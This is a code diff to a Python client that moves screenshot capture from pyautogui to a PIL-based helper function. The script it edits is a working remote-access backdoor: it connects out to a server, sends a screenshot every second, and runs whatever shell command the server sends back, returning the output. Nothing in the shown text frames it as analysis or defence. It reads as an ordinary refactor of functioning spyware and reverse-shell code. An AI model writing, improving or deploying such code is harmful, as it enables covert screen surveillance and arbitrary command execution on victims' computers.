@@ -1,8 +1,14 @@
 import socket
 import subprocess
-import pyautogui
+from PIL import ImageGrab
 import io
 import time
+
+def capture_screen():
+    screenshot = ImageGrab.grab()
+    img_byte_arr = io.BytesIO()
+    screenshot.save(img_byte_arr, format='PNG')
+    return img_byte_arr.getvalue()
 
 def connect_to_server():
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -10,29 +16,21 @@ def connect_to_server():
     
     try:
         while True:
-            # Capture screenshot
-            screenshot = pyautogui.screenshot()
-            img_byte_arr = io.BytesIO()
-            screenshot.save(img_byte_arr, format='PNG')
-            img_data = img_byte_arr.getvalue()
-
-            # Send the screenshot to the server
+            # Capture and send screenshot
+            img_data = capture_screen()
             client_socket.sendall(b"SCREENSHOT" + img_data)
 
-            # Wait for the server's command
+            # Receive and execute command
             command = client_socket.recv(1024).decode()
-
             if command.lower() == "exit":
                 break
 
-            # Execute the command and send the result back to the server
             output = subprocess.getoutput(command)
             if not output:
                 output = "Command executed."
             client_socket.sendall(output.encode())
 
-            # Sleep to avoid flooding the server with screenshots
-            time.sleep(1)
+            time.sleep(1)  # Delay to avoid flooding the server
 
     except Exception as e:
         print(f"Error: {e}")
